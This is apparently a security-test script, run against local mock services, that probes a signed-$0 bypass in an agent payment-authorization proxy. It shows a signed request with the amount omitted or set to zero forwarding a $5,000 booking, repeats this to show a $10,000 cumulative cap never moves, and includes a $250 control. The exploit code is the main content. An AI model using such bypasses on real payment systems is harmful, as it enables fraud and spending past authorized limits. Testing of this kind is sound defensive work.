// attack4 — how far does the signed-$0 hole go?
import { newAgent, sign, authorize } from './agent.mjs';
const API='http://127.0.0.1:4402', PROXY='http://127.0.0.1:4405', UP='http://127.0.0.1:4403';
const agent=newAgent();
const upCalls=async()=>(await (await fetch(UP+'/__calls')).json());
const state=async()=>(await (await fetch(API+'/__state')).json());
async function proxy(signed,body){const h={'content-type':'application/json'};if(signed)h['x-magp-request']=JSON.stringify(signed);
  const r=await fetch(PROXY+'/book-flight',{method:'POST',headers:h,body});let t=await r.text();let j=null;try{j=JSON.parse(t)}catch{};return{status:r.status,text:t,body:j};}

// M1 — signed request that OMITS amount entirely (verifyRequest defaults it to 0)
console.log('=== M1  signed request with NO amount field at all ===');
await fetch(API+'/__reset'); await fetch(UP+'/__reset',{method:'POST'});
{ const a=await authorize(API,agent,{action:'book-flight',amount:0,merchant:'skyward-air'});
  const s=sign(agent,{action:'book-flight',amount:undefined,merchant:'skyward-air',authorizationId:a.authorizationId});
  delete s.amount;                                   // not present in the signed blob at all
  const r=await proxy(s,JSON.stringify({merchant:'skyward-air',booking:{amount:5000}}));
  const c=await upCalls();
  console.log(`  ${c.length?'*** BYPASS':'blocked'}: proxy=${r.status} ${r.body?.reasonCode??'FORWARDED'}  upstream got: ${c.length?c[0].body:'(nothing)'}`); }

// M2 — amplification: a $0 authorization reserves $0, so the cumulative cap never advances
console.log('\n=== M2  repeat the signed-$0 attack — does the $10,000 cumulative cap ever stop it? ===');
await fetch(API+'/__reset'); await fetch(UP+'/__reset',{method:'POST'});
let executed=0;
for (let i=0;i<20;i++){
  const a=await authorize(API,agent,{action:'book-flight',amount:0,merchant:'skyward-air'});
  if(!a.authorizationId){ console.log(`  issuer stopped at ${i}: ${a.reasonCode}`); break; }
  const s=sign(agent,{action:'book-flight',amount:0,merchant:'skyward-air',authorizationId:a.authorizationId});
  const r=await proxy(s,JSON.stringify({merchant:'skyward-air',booking:{amount:5000}}));
  if(r.status===200) executed++;
}
const st=await state(); const c=await upCalls();
console.log(`  executed ${executed} calls; upstream saw ${c.length} bookings of $5000 = $${c.length*5000}`);
console.log(`  issuer-reserved spend after all of it: $${st.reserved} of the $10,000 cap  ${st.reserved===0?'*** cap never moved — the attack is unbounded':''}`);

// M3 — control: the SAME nested body under a signed NON-zero amount is still refused
console.log('\n=== M3  control — identical body, signed $250 instead of $0 ===');
await fetch(API+'/__reset'); await fetch(UP+'/__reset',{method:'POST'});
{ const a=await authorize(API,agent,{action:'book-flight',amount:250,merchant:'skyward-air'});
  const s=sign(agent,{action:'book-flight',amount:250,merchant:'skyward-air',authorizationId:a.authorizationId});
  const r=await proxy(s,JSON.stringify({merchant:'skyward-air',booking:{amount:5000}}));
  const c=await upCalls();
  console.log(`  proxy=${r.status} ${r.body?.reasonCode??'FORWARDED'}  upstream got: ${c.length?c[0].body:'(nothing)'}  ${c.length?'*** BYPASS':'blocked — 0 is the only amount that opens this'}`); }
